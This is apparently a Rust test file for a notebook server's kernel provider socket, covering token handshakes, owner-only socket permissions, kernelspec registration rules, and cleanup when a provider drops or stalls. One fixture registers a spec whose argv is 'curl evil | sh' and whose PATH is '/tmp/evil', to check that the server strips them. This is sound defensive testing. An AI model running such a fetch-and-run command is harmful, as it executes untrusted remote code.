//! The kernel provider socket (#983): a fake provider over a real Unix
//! socket, against the server's registered kernels and the REST API.
//!
//! These drive [`kernel_providers::start`] and [`build_router`] directly
//! rather than [`ganymede_server::serve::run_with`]: the `run_with`
//! servers a test can stop are embedded, and an embedded server opens no
//! provider socket, while a server that isn't embedded stops only on a
//! signal, which a test can't send without stopping its siblings.
#![cfg(unix)]

use async_trait::async_trait;
use axum::body::Body;
use axum::http::{header, Request, StatusCode};
use ganymede_api::{
    KernelManager, KernelManagerConfig, SessionManager, StaticKernelspecs, TransportFactory,
};
use ganymede_contents::{FsContents, FsOptions};
use ganymede_kernel_host::protocol::{content, Channel, Message};
use ganymede_kernel_host::{
    KernelSession, KernelTransport, Kernelspec, KernelspecSource, LaunchOptions, LaunchedKernel,
    Provisioner, RegisteredKernels,
};
use ganymede_server::kernel_providers::{self, Timing};
use ganymede_server::{build_router, AppState};
use serde_json::{json, Value};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex, OnceLock};
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader, ReadHalf, WriteHalf};
use tokio::net::UnixStream;
use tower::ServiceExt;

const TOKEN: &str = "provider-token";

/// One provider connection, from the provider's end.
struct Fake {
    reader: BufReader<ReadHalf<UnixStream>>,
    writer: WriteHalf<UnixStream>,
}

impl Fake {
    /// Connects and says `hello`, checking the server said `welcome`.
    async fn connect(path: &Path) -> Fake {
        let stream = UnixStream::connect(path)
            .await
            .expect("the provider socket takes a connection");
        let (r, w) = tokio::io::split(stream);
        let mut fake = Fake {
            reader: BufReader::new(r),
            writer: w,
        };
        fake.send(json!({"op": "hello", "token": TOKEN})).await;
        let welcome = fake.recv().await.expect("a welcome");
        assert_eq!(welcome["op"], "welcome", "{welcome}");
        assert!(welcome.get("error").is_none(), "{welcome}");
        fake
    }

    async fn send(&mut self, frame: Value) {
        let mut line = frame.to_string();
        line.push('\n');
        self.writer.write_all(line.as_bytes()).await.unwrap();
    }

    /// The next frame, or `None` at EOF.
    async fn next(&mut self) -> Option<Value> {
        let mut line = String::new();
        let n = tokio::time::timeout(Duration::from_secs(10), self.reader.read_line(&mut line))
            .await
            .unwrap_or_else(|_| panic!("no frame from the server in 10 s"))
            .unwrap();
        (n > 0).then(|| serde_json::from_str(&line).unwrap())
    }

    async fn recv(&mut self) -> Option<Value> {
        self.next().await
    }

    /// Registers `spec` and returns the server's `registered` frame.
    async fn register(&mut self, spec: Value) -> Value {
        self.send(json!({"op": "register", "spec": spec})).await;
        let reply = self.next().await.expect("a registered frame");
        assert_eq!(reply["op"], "registered", "{reply}");
        reply
    }
}

/// The frames the server sent, in order, for assertions after the fact.
#[derive(Clone, Default)]
struct Frames(Arc<Mutex<Vec<Value>>>);

impl Frames {
    fn push(&self, frame: &Value) {
        self.0.lock().unwrap().push(frame.clone());
    }

    /// The messages the server sent the kernel.
    fn sent_messages(&self) -> Vec<Message> {
        self.0
            .lock()
            .unwrap()
            .iter()
            .filter(|f| f["op"] == "send")
            .map(|f| message(&f["msg"]))
            .collect()
    }

    /// The `launch` of each `start` frame.
    fn starts(&self) -> Vec<Value> {
        self.0
            .lock()
            .unwrap()
            .iter()
            .filter(|f| f["op"] == "start")
            .map(|f| f["launch"].clone())
            .collect()
    }

    /// The frames' ops, in order.
    fn ops(&self) -> Vec<String> {
        self.0
            .lock()
            .unwrap()
            .iter()
            .map(|f| f["op"].as_str().unwrap_or("").to_string())
            .collect()
    }

    /// The `send` frames themselves, channel included.
    fn sends(&self) -> Vec<Value> {
        self.0
            .lock()
            .unwrap()
            .iter()
            .filter(|f| f["op"] == "send")
            .cloned()
            .collect()
    }
}

/// A frame's `msg` as a [`Message`], with its base64 buffers dropped: the
/// tests assert on the header and content.
fn message(v: &Value) -> Message {
    let mut v = v.clone();
    v.as_object_mut().unwrap().remove("buffers");
    serde_json::from_value(v).unwrap()
}

/// `msg` in the shape the socket carries: the websocket's JSON, with
/// buffers as base64 strings.
fn wire(msg: &Message) -> Value {
    let mut v = serde_json::to_value(msg).unwrap();
    v["buffers"] = json!([]);
    v
}

fn status(parent: &Message, state: &str) -> Value {
    wire(
        &Message::new("status", "k", "k", &json!({"execution_state": state}))
            .with_parent(parent.header.clone()),
    )
}

/// What a provider does with the server's `send`: answers the requests a
/// kernel answers, so a start and an execute complete.
async fn answer(fake: &mut Fake, id: &str, msg: &Message) {
    let iopub = |m: Value| json!({"op": "deliver", "kernel_id": id, "channel": "iopub", "msg": m});
    let shell = |m: Value| json!({"op": "deliver", "kernel_id": id, "channel": "shell", "msg": m});
    let control =
        |m: Value| json!({"op": "deliver", "kernel_id": id, "channel": "control", "msg": m});
    match msg.msg_type() {
        "kernel_info_request" => {
            let info = serde_json::to_value(ganymede_kernel_host::testing::kernel_info()).unwrap();
            fake.send(iopub(status(msg, "busy"))).await;
            fake.send(shell(wire(&Message::reply_to(
                msg,
                "kernel_info_reply",
                &info,
            ))))
            .await;
            fake.send(iopub(status(msg, "idle"))).await;
        }
        "execute_request" => {
            let code = msg.content["code"].as_str().unwrap_or_default().to_string();
            fake.send(iopub(status(msg, "busy"))).await;
            fake.send(iopub(wire(&Message::reply_to(
                msg,
                "execute_result",
                &json!({"data": {"text/plain": format!("ran {code}")}, "execution_count": 1}),
            ))))
            .await;
            fake.send(shell(wire(&Message::reply_to(
                msg,
                "execute_reply",
                &json!({"status": "ok", "execution_count": 1, "payload": [], "user_expressions": {}}),
            ))))
            .await;
            fake.send(iopub(status(msg, "idle"))).await;
        }
        "interrupt_request" => {
            fake.send(control(wire(&Message::reply_to(
                msg,
                "interrupt_reply",
                &json!({"status": "ok"}),
            ))))
            .await;
        }
        "shutdown_request" => {
            fake.send(shell(wire(&Message::reply_to(
                msg,
                "shutdown_reply",
                &json!({"status": "ok", "restart": false}),
            ))))
            .await;
        }
        _ => {}
    }
}

/// Answers frames until the server sends `stop` (or closes). Once `mute`
/// is set, it stops reading and keeps the socket open: a provider that
/// takes nothing.
async fn serve(mut fake: Fake, log: Frames, mute: Arc<AtomicBool>) {
    while let Some(frame) = fake.next().await {
        log.push(&frame);
        let id = frame["kernel_id"].as_str().unwrap_or_default().to_string();
        match frame["op"].as_str().unwrap_or_default() {
            "start" => {
                let launch = &frame["launch"];
                // Only the session name, if any: no cwd, no other env.
                assert!(launch.get("cwd").is_none(), "a start names no cwd: {frame}");
                for key in launch["env"].as_object().unwrap().keys() {
                    assert_eq!(key, "JPY_SESSION_NAME", "a start names no env: {frame}");
                }
                fake.send(json!({"op": "started", "kernel_id": id})).await;
            }
            "send" => {
                if mute.load(Ordering::SeqCst) {
                    // Open, and never read again: the socket's buffers fill
                    // and the server's write stalls.
                    std::mem::forget(fake);
                    return;
                }
                answer(&mut fake, &id, &message(&frame["msg"])).await;
            }
            "stop" => return,
            _ => {}
        }
    }
}

/// A provisioner and transport factory that fail: every kernel in these
/// tests comes from the provider, never the fallback.
struct Never;

#[async_trait]
impl Provisioner for Never {
    async fn launch(
        &self,
        spec: &Kernelspec,
        _: LaunchOptions,
    ) -> ganymede_kernel_host::Result<LaunchedKernel> {
        Err(ganymede_kernel_host::Error::NoSuchKernelspec(
            spec.name.clone(),
        ))
    }
}

#[async_trait]
impl TransportFactory for Never {
    async fn connect(&self, _: &LaunchedKernel) -> ganymede_kernel_host::Result<KernelTransport> {
        unreachable!("a registered kernel carries its own transport")
    }
}

/// The registered set in front of a fallback that lists `on_disk`, and a
/// `KernelManager` that runs every kernel through it, as `serve.rs` does.
fn kit(root: &Path, on_disk: Vec<Kernelspec>) -> (Arc<RegisteredKernels>, Arc<KernelManager>) {
    let registered = Arc::new(RegisteredKernels::new());
    registered.set_fallback(
        Arc::new(StaticKernelspecs(on_disk)),
        Arc::new(Never),
        Arc::new(Never),
    );
    let kernels = Arc::new(KernelManager::new(
        registered.clone(),
        registered.clone(),
        registered.clone(),
        KernelManagerConfig {
            startup_timeout: Duration::from_secs(10),
            root_dir: root.into(),
            ..Default::default()
        },
    ));
    (registered, kernels)
}

fn state(
    root: &Path,
    registered: &Arc<RegisteredKernels>,
    kernels: Arc<KernelManager>,
) -> AppState {
    AppState {
        sessions: Arc::new(SessionManager::new(kernels.clone())),
        kernels,
        contents: Arc::new(FsContents::new(root, FsOptions::default()).unwrap()),
        token: Some(TOKEN.into()),
        cookie_secret: Arc::from(&b"provider-secret"[..]),
        allow_origins: vec![],
        allow_credentials: false,
        allow_remote_access: false,
        local_hostnames: vec!["localhost".into()],
        trust_xheaders: false,
        tailnet_allow: Arc::from([]),
        tailnet_whois: None,
        tailnet_seen: Default::default(),
        max_body_size: 512 * 1024 * 1024,
        base_url: "/".into(),
        config_dir: root.join(".jupyter-config"),
        lab: None,
        static_dir: None,
        static_headers: Arc::new([]),
        frame_ancestors: ganymede_server::frame_ancestors_directive("'self'").unwrap(),
        collab: Arc::new(ganymede_server::collab::Collab::new(
            ganymede_contents::FileIds::in_memory(),
            root.canonicalize().ok(),
        )),
        write_observer: Default::default(),
        terminals: None,
        lsp: None,
        mcp: None,
        metrics: Default::default(),
        host: Default::default(),
        machines: Default::default(),
        registered: Some(registered.clone()),
    }
}

async fn call(
    app: &axum::Router,
    method: &str,
    path: &str,
    body: Option<Value>,
) -> (StatusCode, Value) {
    let req = Request::builder()
        .method(method)
        .uri(path)
        .header(header::AUTHORIZATION, format!("token {TOKEN}"));
    let req = if body.is_some() {
        req.header(header::CONTENT_TYPE, "application/json")
    } else {
        req
    }
    .body(match body {
        Some(b) => Body::from(b.to_string()),
        None => Body::empty(),
    })
    .unwrap();
    let resp = app.clone().oneshot(req).await.unwrap();
    let status = resp.status();
    let bytes = axum::body::to_bytes(resp.into_body(), 1 << 24)
        .await
        .unwrap();
    let value = serde_json::from_slice(&bytes).unwrap_or(Value::Null);
    (status, value)
}

/// The runtime dir every server here uses, set once: the socket's path
/// comes from it, and two servers in one process would share a pid.
fn runtime_dir() -> PathBuf {
    static DIR: OnceLock<PathBuf> = OnceLock::new();
    DIR.get_or_init(|| {
        let dir = tempfile::tempdir().expect("a temp runtime dir");
        std::env::set_var("JUPYTER_RUNTIME_DIR", dir.path());
        dir.keep()
    })
    .clone()
}

/// Serializes the tests: each one opens the socket at the pid's path, and
/// the info file and socket must not meet another test's server.
static SERIAL: OnceLock<tokio::sync::Mutex<()>> = OnceLock::new();

async fn serial() -> tokio::sync::MutexGuard<'static, ()> {
    let guard = SERIAL.get_or_init(Default::default).lock().await;
    // Before any listener opens: the socket's directory is read once.
    runtime_dir();
    guard
}

fn spec(name: &str) -> Kernelspec {
    serde_json::from_value(json!({"argv": ["true"], "display_name": name}))
        .map(|mut s: Kernelspec| {
            s.name = name.into();
            s
        })
        .unwrap()
}

/// Off is off: `start` opens nothing, and the info file has no key.
#[tokio::test]
async fn the_socket_is_off_by_default() {
    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let (registered, _) = kit(dir.path(), vec![]);
    let runtime = runtime_dir();
    let path = runtime.join(format!("ganymede-kernels-{}.sock", std::process::id()));
    let _ = std::fs::remove_file(&path);

    let off = kernel_providers::start(
        false,
        false,
        Some(TOKEN),
        Timing::default(),
        registered.clone(),
        &BTreeMap::new(),
    );
    assert!(off.is_none(), "nothing opens with [kernel_providers] off");
    assert!(!path.exists(), "no socket file, {}", path.display());
}

/// `hello` is checked: the token, and within the timeout.
#[tokio::test]
async fn the_handshake_is_checked() {
    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let (registered, _) = kit(dir.path(), vec![]);
    let timing = Timing {
        hello: Duration::from_millis(300),
        write_stall: Duration::from_secs(5),
        ..Timing::default()
    };
    let listener = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        timing,
        registered.clone(),
        &BTreeMap::new(),
    )
    .expect("the socket opens");

    // A wrong token: `welcome` with the error, then closed.
    let mut wrong = UnixStream::connect(listener.path()).await.unwrap();
    wrong
        .write_all(b"{\"op\":\"hello\",\"token\":\"not-it\"}\n")
        .await
        .unwrap();
    let mut reader = BufReader::new(wrong);
    let mut line = String::new();
    reader.read_line(&mut line).await.unwrap();
    let welcome: Value = serde_json::from_str(&line).unwrap();
    assert_eq!(welcome["op"], "welcome");
    assert!(
        welcome["error"].as_str().unwrap().contains("token"),
        "{welcome}"
    );
    line.clear();
    assert_eq!(
        reader.read_line(&mut line).await.unwrap(),
        0,
        "closed after"
    );

    // No hello at all: the same, once the timeout passes.
    let began = std::time::Instant::now();
    let silent = UnixStream::connect(listener.path()).await.unwrap();
    let mut reader = BufReader::new(silent);
    let mut line = String::new();
    reader.read_line(&mut line).await.unwrap();
    let welcome: Value = serde_json::from_str(&line).unwrap();
    assert!(
        welcome["error"].as_str().unwrap().contains("hello"),
        "{welcome}"
    );
    assert!(began.elapsed() >= Duration::from_millis(250), "{began:?}");
    line.clear();
    assert_eq!(
        reader.read_line(&mut line).await.unwrap(),
        0,
        "closed after"
    );

    // A first frame that isn't hello.
    let mut other = UnixStream::connect(listener.path()).await.unwrap();
    other.write_all(b"{\"op\":\"register\"}\n").await.unwrap();
    let mut reader = BufReader::new(other);
    let mut line = String::new();
    reader.read_line(&mut line).await.unwrap();
    let welcome: Value = serde_json::from_str(&line).unwrap();
    assert!(
        welcome["error"].as_str().unwrap().contains("register"),
        "{welcome}"
    );
}

/// A `0600` socket at the pid's path, named in the info file.
#[tokio::test]
async fn the_socket_is_named_in_the_info_file() {
    use std::os::unix::fs::PermissionsExt;
    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let (registered, _) = kit(dir.path(), vec![]);
    let listener = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        Timing::default(),
        registered.clone(),
        &BTreeMap::new(),
    )
    .expect("the socket opens");
    let path = listener.path().to_path_buf();
    assert_eq!(
        path,
        runtime_dir().join(format!("ganymede-kernels-{}.sock", std::process::id()))
    );
    let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode, 0o600, "the socket is owner-only");

    let info = ganymede_server::server_info::ServerInfo {
        ip: "127.0.0.1",
        addr: "127.0.0.1:8888".parse().unwrap(),
        base_url: "/",
        token: Some(TOKEN),
        root_dir: dir.path(),
        page: "",
        kernel_providers_socket: Some(&path),
    };
    assert_eq!(
        info.to_json()["kernel_providers_socket"],
        path.to_str().unwrap()
    );

    // Dropping the listener removes the file, as the server stopping does.
    drop(listener);
    assert!(!path.exists(), "the socket outlived its server");
}

/// A handshake that passes, a spec registered and listed without its
/// `argv` and `env`, and a kernel started, interrupted and deleted
/// through the API.
#[tokio::test]
async fn a_provider_kernel_runs_through_the_api() {
    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let (registered, kernels) = kit(dir.path(), vec![]);
    let app = build_router(state(dir.path(), &registered, kernels.clone()));
    let listener = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        Timing::default(),
        registered.clone(),
        &BTreeMap::new(),
    )
    .expect("the socket opens");

    let mut fake = Fake::connect(listener.path()).await;
    let reply = fake
        .register(json!({
            "name": "Cdp-Browser",
            "display_name": "Browser",
            "language": "typescript",
            "argv": ["/bin/sh", "-c", "curl evil | sh"],
            "env": {"PATH": "/tmp/evil"},
            "interrupt_mode": "signal",
            "metadata": {"capabilities": {"device": true}},
        }))
        .await;
    assert_eq!(reply["name"], "cdp-browser", "{reply}");

    // Listed after the fallback's (none here), under its lowercased name,
    // with no program to run.
    let (code, specs) = call(&app, "GET", "/api/kernelspecs", None).await;
    assert_eq!(code, StatusCode::OK);
    let listed = &specs["kernelspecs"]["cdp-browser"]["spec"];
    assert_eq!(listed["display_name"], "Browser", "{specs}");
    assert_eq!(listed["language"], "typescript", "{specs}");
    assert!(
        listed["metadata"]["capabilities"]["device"] == json!(true),
        "metadata passes through: {specs}"
    );
    assert!(
        listed.get("argv").is_none_or(|v| v == &json!([])),
        "a provider's argv is dropped: {specs}"
    );
    assert!(
        listed
            .get("env")
            .is_none_or(|v| v.as_object().unwrap().is_empty()),
        "a provider's env is dropped: {specs}"
    );

    let log = Frames::default();
    let mute = Arc::new(AtomicBool::new(false));
    let serving = tokio::spawn(serve(fake, log.clone(), mute));

    // Starting it goes to the provider, which answers `started`.
    let (code, kernel) = call(
        &app,
        "POST",
        "/api/kernels",
        Some(json!({"name": "cdp-browser"})),
    )
    .await;
    assert_eq!(code, StatusCode::CREATED, "{kernel}");
    let id = kernel["id"].as_str().unwrap().to_string();
    assert!(log.ops().contains(&"start".to_string()), "{:?}", log.ops());

    // Running a cell goes through the room's execute endpoint, the same
    // send path: the provider's execute_result becomes the cell's output.
    std::fs::write(
        dir.path().join("run.ipynb"),
        serde_json::to_string(&json!({
            "cells": [{"cell_type": "code", "execution_count": null, "id": "a",
                       "metadata": {}, "outputs": [], "source": "2+2"}],
            "metadata": {}, "nbformat": 4, "nbformat_minor": 5
        }))
        .unwrap(),
    )
    .unwrap();
    let (code, v) = call(&app, "POST", "/api/fileid/index?path=run.ipynb", None).await;
    assert_eq!(code, StatusCode::OK, "{v}");
    let document = format!("json:notebook:{}", v["id"].as_str().unwrap());
    let hash = ganymede_documents::murmur2(b"2+2", 0).to_string();
    let (code, v) = call(
        &app,
        "POST",
        &format!("/api/kernels/{id}/execute"),
        Some(json!({
            "document_id": document,
            "wait": 15,
            "cells": [{"cell_id": "a", "source_hash": hash}],
        })),
    )
    .await;
    assert_eq!(code, StatusCode::OK, "{v}");
    assert_eq!(v["finished"], true, "{v}");
    assert!(
        v["cells"][0]["outputs"].to_string().contains("ran 2+2"),
        "the provider's execute_result is the cell's output: {v:#}"
    );

    // An interrupt arrives on control, as the C ABI's does.
    let (code, _) = call(&app, "POST", &format!("/api/kernels/{id}/interrupt"), None).await;
    assert_eq!(code, StatusCode::NO_CONTENT);
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    while std::time::Instant::now() < deadline
        && !log
            .sent_messages()
            .iter()
            .any(|m| m.msg_type() == "interrupt_request")
    {
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    assert!(
        log.sent_messages()
            .iter()
            .any(|m| m.msg_type() == "interrupt_request"),
        "{:?}",
        log.sent_messages()
            .iter()
            .map(Message::msg_type)
            .collect::<Vec<_>>()
    );

    // Deleting asks it to exit, then stops it.
    let (code, _) = call(&app, "DELETE", &format!("/api/kernels/{id}"), None).await;
    assert_eq!(code, StatusCode::NO_CONTENT);
    tokio::time::timeout(Duration::from_secs(10), serving)
        .await
        .expect("the provider saw the shutdown and the stop")
        .unwrap();
    let ops = log.ops();
    assert!(ops.contains(&"stop".to_string()), "{ops:?}");
    assert!(
        log.sent_messages()
            .iter()
            .any(|m| m.msg_type() == "shutdown_request"),
        "{ops:?}"
    );
    let interrupt = log
        .sends()
        .into_iter()
        .find(|f| f["msg"]["header"]["msg_type"] == "interrupt_request")
        .unwrap_or_else(|| panic!("{ops:?}"));
    assert_eq!(
        interrupt["channel"], "control",
        "an interrupt goes on control, not {}",
        interrupt["channel"]
    );
}

/// A reserved name is refused to a provider whose signature doesn't meet
/// the requirement, before the first-come check, and isn't listed; a name
/// with no reservation on the same connection still registers.
#[tokio::test]
async fn a_reserved_name_is_refused_and_another_registers() {
    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let (registered, kernels) = kit(dir.path(), vec![]);
    let app = build_router(state(dir.path(), &registered, kernels.clone()));
    let reserve = BTreeMap::from([("cdp-browser".to_string(), "never".to_string())]);
    let listener = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        Timing::default(),
        registered.clone(),
        &reserve,
    )
    .expect("the socket opens");

    let mut fake = Fake::connect(listener.path()).await;
    let reply = fake
        .register(json!({"name": "cdp-browser", "display_name": "Browser"}))
        .await;
    assert!(
        reply["error"]
            .as_str()
            .unwrap_or_default()
            .contains("reserved"),
        "{reply}"
    );
    let (code, specs) = call(&app, "GET", "/api/kernelspecs", None).await;
    assert_eq!(code, StatusCode::OK);
    assert!(specs["kernelspecs"]["cdp-browser"].is_null(), "{specs}");

    // Not the connection's fault, and not the first-come check's: its own
    // name registers, and is listed.
    let reply = fake
        .register(json!({"name": "cdp-node", "display_name": "Node"}))
        .await;
    assert!(reply.get("error").is_none(), "{reply}");
    let (_, specs) = call(&app, "GET", "/api/kernelspecs", None).await;
    assert!(specs["kernelspecs"]["cdp-node"].is_object(), "{specs}");
}

/// On macOS a provider whose signature meets the requirement registers the
/// reserved name as any other name.
#[cfg(target_os = "macos")]
#[tokio::test]
async fn a_reserved_name_is_allowed_to_the_program_that_meets_it() {
    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let (registered, kernels) = kit(dir.path(), vec![]);
    let app = build_router(state(dir.path(), &registered, kernels.clone()));
    let reserve = BTreeMap::from([("cdp-browser".to_string(), "always".to_string())]);
    let listener = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        Timing::default(),
        registered.clone(),
        &reserve,
    )
    .expect("the socket opens");

    let mut fake = Fake::connect(listener.path()).await;
    let reply = fake
        .register(json!({"name": "cdp-browser", "display_name": "Browser"}))
        .await;
    assert!(reply.get("error").is_none(), "{reply}");
    let (_, specs) = call(&app, "GET", "/api/kernelspecs", None).await;
    assert!(specs["kernelspecs"]["cdp-browser"].is_object(), "{specs}");
}

/// A second connection can't take a name the first holds, a name on disk
/// is refused, and a provider's own name can be given back.
#[tokio::test]
async fn registrations_are_first_come_and_dropped_from_the_fallback() {
    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let (registered, kernels) = kit(dir.path(), vec![spec("on-disk"), spec("shared")]);
    let app = build_router(state(dir.path(), &registered, kernels.clone()));
    let listener = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        Timing::default(),
        registered.clone(),
        &BTreeMap::new(),
    )
    .expect("the socket opens");

    let mut first = Fake::connect(listener.path()).await;
    let reply = first
        .register(json!({"name": "cdp-node", "display_name": "Node"}))
        .await;
    assert!(reply.get("error").is_none(), "{reply}");

    // A name a kernelspec on disk lists, and one already registered.
    let reply = first
        .register(json!({"name": "on-disk", "display_name": "Mine"}))
        .await;
    assert!(
        reply["error"]
            .as_str()
            .unwrap_or_default()
            .contains("installed already"),
        "{reply}"
    );
    let reply = first
        .register(json!({"name": "shared", "display_name": "Mine"}))
        .await;
    assert!(reply["error"].is_string(), "{reply}");

    let mut second = Fake::connect(listener.path()).await;
    let reply = second
        .register(json!({"name": "CDP-Node", "display_name": "Mine"}))
        .await;
    assert!(
        reply["error"]
            .as_str()
            .unwrap_or_default()
            .contains("already registered"),
        "{reply}"
    );
    // A name it doesn't hold: nothing happens, and the holder keeps it. A
    // round trip first, so the unregister is certainly processed and this
    // isn't passing only because it hadn't been read yet.
    second
        .send(json!({"op": "unregister", "name": "cdp-node"}))
        .await;
    let reply = second
        .register(json!({"name": "second-only", "display_name": "Second"}))
        .await;
    assert_eq!(reply["name"], "second-only", "{reply}");
    let (_, specs) = call(&app, "GET", "/api/kernelspecs", None).await;
    assert!(specs["kernelspecs"]["cdp-node"].is_object(), "{specs}");

    // Its own: given back, and gone from the list.
    first
        .send(json!({"op": "unregister", "name": "cdp-node"}))
        .await;
    tokio::time::sleep(Duration::from_millis(100)).await;
    let (_, specs) = call(&app, "GET", "/api/kernelspecs", None).await;
    assert!(specs["kernelspecs"]["cdp-node"].is_null(), "{specs}");
}

/// A dropped connection takes its spec and its kernel with it, with no
/// restart, and a reconnect gets a new kernel.
#[tokio::test]
async fn a_dropped_connection_loses_its_kernels() {
    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let (registered, kernels) = kit(dir.path(), vec![]);
    let app = build_router(state(dir.path(), &registered, kernels.clone()));
    let listener = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        Timing::default(),
        registered.clone(),
        &BTreeMap::new(),
    )
    .expect("the socket opens");

    let mut fake = Fake::connect(listener.path()).await;
    fake.register(json!({"name": "cdp-node", "display_name": "Node"}))
        .await;
    let log = Frames::default();
    let mute = Arc::new(AtomicBool::new(false));
    let serving = tokio::spawn(serve(fake, log, mute));

    let (code, kernel) = call(
        &app,
        "POST",
        "/api/kernels",
        Some(json!({"name": "cdp-node"})),
    )
    .await;
    assert_eq!(code, StatusCode::CREATED, "{kernel}");
    let first = kernel["id"].as_str().unwrap().to_string();
    let (_, listed) = call(&app, "GET", "/api/kernels", None).await;
    assert_eq!(listed.as_array().unwrap().len(), 1, "{listed}");

    // The provider goes away.
    serving.abort();
    let _ = serving.await;
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    loop {
        let (_, listed) = call(&app, "GET", "/api/kernels", None).await;
        if listed.as_array().unwrap().is_empty() {
            break;
        }
        assert!(
            std::time::Instant::now() < deadline,
            "the kernel stayed listed after its provider left: {listed}"
        );
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    // Not restarted, and its name is forgotten.
    tokio::time::sleep(Duration::from_millis(200)).await;
    let (_, listed) = call(&app, "GET", "/api/kernels", None).await;
    assert!(
        listed.as_array().unwrap().is_empty(),
        "a lost provider kernel is never restarted: {listed}"
    );
    let (code, _) = call(&app, "GET", &format!("/api/kernels/{first}"), None).await;
    assert_eq!(code, StatusCode::NOT_FOUND);
    let (_, specs) = call(&app, "GET", "/api/kernelspecs", None).await;
    assert!(specs["kernelspecs"]["cdp-node"].is_null(), "{specs}");

    // A provider that connects again gets a new kernel, never the old id.
    let mut again = Fake::connect(listener.path()).await;
    again
        .register(json!({"name": "cdp-node", "display_name": "Node"}))
        .await;
    let log = Frames::default();
    let mute = Arc::new(AtomicBool::new(false));
    let _serving = tokio::spawn(serve(again, log, mute));
    let (code, kernel) = call(
        &app,
        "POST",
        "/api/kernels",
        Some(json!({"name": "cdp-node"})),
    )
    .await;
    assert_eq!(code, StatusCode::CREATED, "{kernel}");
    assert_ne!(kernel["id"].as_str().unwrap(), first, "{kernel}");
}

/// A provider that stops reading is closed rather than written to
/// forever, and its kernel is lost.
#[tokio::test]
async fn a_provider_that_takes_nothing_is_closed() {
    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let (registered, _) = kit(dir.path(), vec![]);
    let timing = Timing {
        hello: Duration::from_secs(5),
        write_stall: Duration::from_millis(200),
        ..Timing::default()
    };
    let listener = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        timing,
        registered.clone(),
        &BTreeMap::new(),
    )
    .expect("the socket opens");

    let mut fake = Fake::connect(listener.path()).await;
    fake.register(json!({"name": "cdp-node", "display_name": "Node"}))
        .await;
    let log = Frames::default();
    let mute = Arc::new(AtomicBool::new(false));
    let _serving = tokio::spawn(serve(fake, log, mute.clone()));

    // Started and executing while it still reads: a message each way.
    let spec = spec("cdp-node");
    let launched = registered
        .launch(
            &spec,
            LaunchOptions {
                kernel_id: Some("slow".into()),
                cwd: Some(dir.path().into()),
                startup_timeout: Some(Duration::from_secs(10)),
                ..Default::default()
            },
        )
        .await
        .expect("the provider starts the kernel");
    let session = KernelSession::start(
        registered.connect(&launched).await.unwrap(),
        Some(&launched),
    );
    session.nudge(Duration::from_secs(10)).await.unwrap();
    let ran = session
        .execute(content::ExecuteRequest::new("2+2"), Duration::from_secs(10))
        .await
        .unwrap();
    assert!(
        ran.outputs.iter().any(|m| {
            m.msg_type() == "execute_result" && m.content["data"]["text/plain"] == json!("ran 2+2")
        }),
        "{:?}",
        ran.outputs
            .iter()
            .map(Message::msg_type)
            .collect::<Vec<_>>()
    );

    // From here it takes nothing: one small message lets the provider
    // notice it is mute, then a message far bigger than the socket's
    // buffers can't be written, and the stall closes the connection.
    mute.store(true, Ordering::SeqCst);
    let _ = session
        .send(
            Channel::Shell,
            Message::new("interrupt_request", "s", "u", &json!({})),
        )
        .await;
    tokio::time::sleep(Duration::from_millis(100)).await;
    let mut big = Message::new("execute_request", "s", "u", &json!({"code": "x"}));
    big.buffers = vec![vec![0u8; 16 * 1024 * 1024].into()];
    let _ = session.send(Channel::Shell, big).await;
    let deadline = std::time::Instant::now() + Duration::from_secs(10);
    while launched.process.is_alive() {
        assert!(
            std::time::Instant::now() < deadline,
            "the stalled provider was not cut off"
        );
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    assert_eq!(launched.process.exit_reason(), Some("lost"));
    assert!(
        !launched.process.restartable(),
        "there is no one to restart it"
    );
    assert!(registered.list().unwrap().is_empty(), "its spec went too");
}

/// A provider is told which session a kernel belongs to, and nothing else
/// about how to run it: no working directory, no environment.
#[tokio::test]
async fn a_start_carries_only_the_session_name() {
    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let (registered, _) = kit(dir.path(), vec![]);
    let listener = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        Timing::default(),
        registered.clone(),
        &BTreeMap::new(),
    )
    .expect("the socket opens");

    let mut fake = Fake::connect(listener.path()).await;
    fake.register(json!({"name": "cdp-node"})).await;
    let log = Frames::default();
    let record = log.clone();
    let serving = tokio::spawn(async move {
        while let Some(frame) = fake.next().await {
            record.push(&frame);
            match frame["op"].as_str() {
                Some("start") => {
                    let id = frame["kernel_id"].as_str().unwrap().to_string();
                    fake.send(json!({"op": "started", "kernel_id": id})).await;
                }
                Some("stop") => return,
                _ => {}
            }
        }
    });

    let launched = registered
        .launch(
            &spec("cdp-node"),
            LaunchOptions {
                kernel_id: Some("k".into()),
                cwd: Some(dir.path().into()),
                env: vec![
                    ("PATH".into(), "/tmp/evil".into()),
                    ("JPY_SESSION_NAME".into(), "sess".into()),
                ],
                startup_timeout: Some(Duration::from_secs(10)),
                ..Default::default()
            },
        )
        .await
        .expect("the provider starts it");

    let starts = log.starts();
    assert_eq!(starts.len(), 1, "{starts:?}");
    let launch = &starts[0];
    assert!(
        launch.get("cwd").is_none(),
